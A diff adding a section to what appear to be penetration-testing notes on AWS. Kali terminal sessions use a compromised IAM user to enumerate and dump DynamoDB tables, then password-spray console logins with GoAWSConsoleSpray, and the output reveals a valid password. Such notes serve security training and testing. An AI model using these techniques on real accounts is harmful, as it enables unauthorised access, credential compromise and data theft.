@@ -1972,7 +1972,83 @@ Specific repository enumeration... The `fileContent` variable is base64-encoded.
 
 ---
 
+Enumerating DynamoDB
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws dynamodb list-tables                    
+{
+    "TableNames": [
+        "analytics_app_users",
+        "user_order_logs"
+    ]
+}
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws dynamodb describe-table --table-name user_order_logs
 
+An error occurred (AccessDeniedException) when calling the DescribeTable operation: User: arn:aws:iam::243687662613:user/migration-test is not authorized to perform: dynamodb:DescribeTable on resource: arn:aws:dynamodb:us-east-1:243687662613:table/user_order_logs because no identity-based policy allows the dynamodb:DescribeTable action
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws dynamodb describe-table --table-name analytics_app_users
+{
+    "Table": {
+        "AttributeDefinitions": [
+            {
+                "AttributeName": "UserID",
+                "AttributeType": "S"
+            }
+        ],
+        "TableName": "analytics_app_users",
+        "KeySchema": [
+            {
+                "AttributeName": "UserID",
+                "KeyType": "HASH"
+            }
+        ],
+        "TableStatus": "ACTIVE",
+        "CreationDateTime": 1691612596.704,
+        "ProvisionedThroughput": {
+            "NumberOfDecreasesToday": 0,
+            "ReadCapacityUnits": 0,
+            "WriteCapacityUnits": 0
+        },
+        "TableSizeBytes": 7734,
+        "ItemCount": 51,
+        "TableArn": "arn:aws:dynamodb:us-east-1:243687662613:table/analytics_app_users",
+        "TableId": "6568c0bb-bdf7-4380-877c-05b7826505ad",
+        "BillingModeSummary": {
+            "BillingMode": "PAY_PER_REQUEST",
+            "LastUpdateToPayPerRequestDateTime": 1691612596.704
+        },
+        "TableClassSummary": {
+            "TableClass": "STANDARD"
+        },
+        "DeletionProtectionEnabled": true,
+        "WarmThroughput": {
+            "ReadUnitsPerSecond": 12000,
+            "WriteUnitsPerSecond": 4000,
+            "Status": "ACTIVE"
+        }
+    }
+}
+```
+
+Then use `aws dynamodb scan --table-name analytics_app_users` to dump the contents
+
+---
+
+Use `GoAWSConsoleSpray` for credential spraying
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ GoAWSConsoleSpray -a 243687662613 -u users1 -p passwords1           
+2025/10/25 12:30:00 GoAWSConsoleSpray: [18] users loaded. [18] passwords loaded. [324] potential login requests.
+2025/10/25 12:30:00 Spraying User: arn:aws:iam::243687662613:user/jyoshida
+2025/10/25 12:30:11 Spraying User: arn:aws:iam::243687662613:user/vkawasaki
+<snip>
+2025/10/25 12:30:57 Spraying User: arn:aws:iam::243687662613:user/rstead
+2025/10/25 12:31:01 (rstead)    [+] SUCCESS:    Valid Password: Abc123!!        MFA: false
+<snip>
+```
 
 
 <br>
